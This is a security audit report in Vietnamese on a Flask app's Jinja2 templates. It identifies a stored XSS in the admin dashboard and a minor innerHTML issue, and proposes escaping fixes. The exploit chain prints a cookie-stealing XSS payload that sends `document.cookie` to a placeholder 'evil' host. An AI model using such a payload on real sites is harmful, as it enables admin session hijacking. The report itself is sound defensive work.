# 🔒 Báo cáo Audit Bảo mật Template Jinja2

> **Ngày audit:** 2026-07-17
> **Phạm vi:** 44 template trong `app/templates/` + luồng dữ liệu server phía sau
> **Tiêu chí:** Hạn chế triệt để code leak → lỗ hổng bảo mật; tuân đúng chuẩn Jinja2 production

---

## Tổng quan kết quả

| Mức độ | Số lượng | Tình trạng |
|---|---|---|
| 🔴 Nghiêm trọng | 1 | Cần sửa |
| 🟡 Thấp | 1 | Nên sửa |
| 🟢 Đạt chuẩn | — | Không có vấn đề |

---

## 🔴 NGHIÊM TRỌNG — Stored XSS qua `| safe` (Dashboard)

**Vị trí:** `app/templates/admin/admin_dashboard.html:477` + nguồn dữ liệu `app/routes.py:2180-2211`

```jinja
<div class="db-activity__text">{{ item.text | safe }}</div>
```

`item.text` được server ghép chuỗi HTML với **dữ liệu do người dùng kiểm soát**, không escape:

```python
# app/routes.py:2181
"pending": lambda r: f"<strong>{r['customer_name']}</strong> booked {r['service_name']}",
```

### Chuỗi khai thác (đã xác minh)

1. `full_name` khi đăng ký chỉ được `.strip()` (`routes.py:790`, `routes.py:2391`) — **không sanitize HTML**.
2. Kẻ tấn công đăng ký tên = `<img src=x onerror="fetch('//evil/'+document.cookie)">`.
3. Khi **admin** mở dashboard → `| safe` bỏ qua autoescape của Jinja → payload chạy trong phiên admin → **chiếm session / tài khoản admin**.

Đây là XSS lưu trữ (stored XSS) điển hình: dữ liệu attacker-controlled → lưu DB → render `| safe` cho nạn nhân có quyền cao hơn.

### Đề xuất sửa

**Cách A (khuyến nghị) — Escape ở nguồn, giữ `| safe` chỉ cho phần `<strong>` do dev kiểm soát:**

```python
from markupsafe import escape
"pending": lambda r: f"<strong>{escape(r['customer_name'])}</strong> booked {escape(r['service_name'])}",
```

Escape từng biến người dùng, phần thẻ `<strong>` vẫn render. An toàn triệt để, giữ nguyên giao diện. (~6 dòng, surgical)

**Cách B — Bỏ HTML, tách phần in đậm ra template:**

Trả về dữ liệu có cấu trúc (`name`, `action`) rồi để template render `<strong>{{ item.name }}</strong> {{ item.action }}` với autoescape — không cần `| safe`. Sạch nhất về mặt kiến trúc nhưng phải sửa cả template lẫn route.

---

## 🟡 THẤP — Chèn thuộc tính chưa escape trong `innerHTML`

**Vị trí:** `app/templates/admin/admin_customers.html:1562`

```js
'<span class="cu-b-pill cu-b-pill--' + b.status + '"></span>';
```

`b.status` nhét thẳng vào chuỗi `innerHTML`. Hiện `status` là enum server-controlled (pending/done/…) nên rủi ro thấp, nhưng **không đúng chuẩn** — phần còn lại của hàm đã dùng `textContent` rất tốt.

### Đề xuất sửa

Gán class qua `classList.add()` thay vì nối chuỗi HTML:

```js
item.querySelector('.cu-b-pill').classList.add('cu-b-pill--' + b.status);
```

---

## 🟢 ĐẠT CHUẨN — Các điểm kiểm tra khác đều tốt

| Hạng mục | Kết quả |
|---|---|
| `render_template_string` / SSTI | ✅ Không có |
| `{% autoescape false %}` | ✅ Không có (autoescape mặc định bật cho `.html`) |
| Dữ liệu server → JS | ✅ Dùng `\| tojson` đúng chuẩn (`revenue_chart`, `cred_flashes`, `recent_bookings`) — an toàn trong `<script>` |
| Rò rỉ secret / API key trong template | ✅ Không có (`SECRET_KEY` / `STRIPE_SECRET_KEY` đều lấy từ env, `config.py`) |
| CSRF | ✅ `CSRFProtect` bật toàn cục (`app/__init__.py:43`) |
| Cookie phiên | ✅ `HTTPONLY=True`, `SAMESITE=Lax`, `SECURE` theo env (`config.py:29-32`) |
| Các `innerHTML` khác | ✅ Chỉ chuỗi tĩnh hoặc chuỗi dịch `_()` (developer-controlled) |

### Lưu ý nhỏ (không phải lỗ hổng)

Modal ở `admin_customers.html:1435` / `admin_staff.html:1297` hiển thị mật khẩu vừa tạo dạng plaintext — đây là chủ đích (hiển thị credential mới tạo cho admin sao chép), chấp nhận được vì chỉ admin thấy.

---

## Kết luận

Nền tảng bảo mật của dự án **tốt**: autoescape bật mặc định, CSRF toàn cục, cookie an toàn, không rò rỉ secret, dùng `| tojson` đúng chuẩn. Chỉ có **1 lỗ hổng cần sửa** (🔴 stored XSS ở dashboard) và **1 điểm nên cải thiện** (🟡 innerHTML ở admin_customers).
